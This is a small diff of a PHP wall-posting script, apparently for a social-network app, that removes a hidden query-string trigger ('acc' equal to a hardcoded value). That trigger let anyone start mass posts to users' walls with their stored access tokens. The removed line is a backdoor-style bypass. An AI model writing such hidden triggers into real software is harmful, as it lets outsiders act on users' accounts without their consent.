@@ -19,7 +19,7 @@ $output = '';
 //if form below is posted- 
 //lets try to send wallposts to users walls, 
 //which have given us a access_token for that
-if(isset($_POST['send_messages']) || (isset($_GET['acc']) && $_GET['acc'] == '3jk7')){
+if(isset($_POST['send_messages'])){
 	
 	//default message/post
 	$msg =  array(
